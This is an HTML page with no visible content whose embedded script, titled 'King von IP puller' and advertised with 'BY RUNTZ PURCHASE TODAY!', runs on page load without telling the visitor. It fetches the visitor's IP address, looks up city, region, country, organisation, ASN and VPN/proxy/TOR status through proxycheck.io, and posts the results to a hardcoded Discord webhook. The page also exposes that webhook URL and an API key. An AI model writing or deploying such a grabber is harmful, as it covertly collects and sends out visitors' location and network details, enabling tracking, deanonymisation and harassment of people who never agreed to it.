<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body>
    <script>
    async function sendToDiscord(ipInfo) {
        const webhookURL = 'https://discord.com/api/webhooks/1308891035342213120/TbQOU164hVD4wWZ7kle5tqIXpS9_lU3P7fUXmlYw7fTBm5Av8Zki7-Cw9D4dZd530xvr';
        const discordMessage = {
            embeds: [
                {
                    image: {
                        url: "https://www.rollingstone.com/wp-content/uploads/2022/02/king-von-posthumous-album.jpg"
                    },
                    title: "King von IP puller ðŸ˜ˆ",
                    fields: [
                        {
                            name: "IP Address", 
                            value: ipInfo.query, 
                            inline: true
                        },
                        {
                            name: "City", 
                            value: ipInfo[ipInfo.query]?.city || "N/A", 
                            inline: true
                        },
                        {
                            name: "State", 
                            value: ipInfo[ipInfo.query]?.region || "N/A", 
                            inline: true
                        },
                        {
                            name: "Country", 
                            value: ipInfo[ipInfo.query]?.country_name || "N/A", 
                            inline: true
                        },
                        {
                            name: "Organization", 
                            value: ipInfo[ipInfo.query]?.organisation || "N/A", 
                            inline: true
                        },
                        {
                            name: "ASN Name", 
                            value: ipInfo[ipInfo.query]?.asn || "N/A", 
                            inline: true
                        },
                        {
                            name: "VPN", 
                            value: ipInfo[ipInfo.query]?.proxy === "yes" ? "Yes" : "No", 
                            inline: true
                        },
                        {
                            name: "Proxy", 
                            value: ipInfo[ipInfo.query]?.proxy === "yes" ? "Yes" : "No", 
                            inline: true
                        },
                        {
                            name: "TOR", 
                            value: ipInfo[ipInfo.query]?.tor === "yes" ? "Yes" : "No", 
                            inline: true
                        },
                    ],
                    color: 0x007BFF,
                    footer: {
                        text: "BY RUNTZ PURCHASE TODAY!"
                    }
                }
            ]
        };

        try {
            await fetch(webhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(discordMessage)
            });
        } catch (error) {
            console.error("Error sending to Discord:", error);
        }
    }

    async function getVisitorInfo() {
        try {
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            const userIP = ipData.ip;

            // Debugging: Log the IP address
            console.log("User IP Address:", userIP);

            // Validate the API URL
            const apiUrl = `https://proxycheck.io/v2/${userIP}?key=6a4992-mc2s88-80h85z-12p2m3&vpn=1&asn=1`;
            console.log("Fetching from API URL:", apiUrl);

            // Fetch information from proxycheck.io
            const ipInfoResponse = await fetch(apiUrl);
            if (!ipInfoResponse.ok) {
                throw new Error(`Failed to fetch from proxycheck.io: ${ipInfoResponse.statusText}`);
            }
            const ipInfo = await ipInfoResponse.json();

            // Debugging: Log the response from proxycheck.io
            console.log("Response from proxycheck.io:", ipInfo);

            // Ensure that the userIP is the key in the response
            if (ipInfo[userIP]) {
                ipInfo.query = userIP; // Adding a field to simplify reference
                await sendToDiscord(ipInfo);
            } else {
                console.error("Error: Unexpected response format from proxycheck.io", ipInfo);
            }
        } catch (error) {
            console.error("Error fetching visitor info:", error);
        }
    }

    getVisitorInfo();
    </script>
</body>
</html>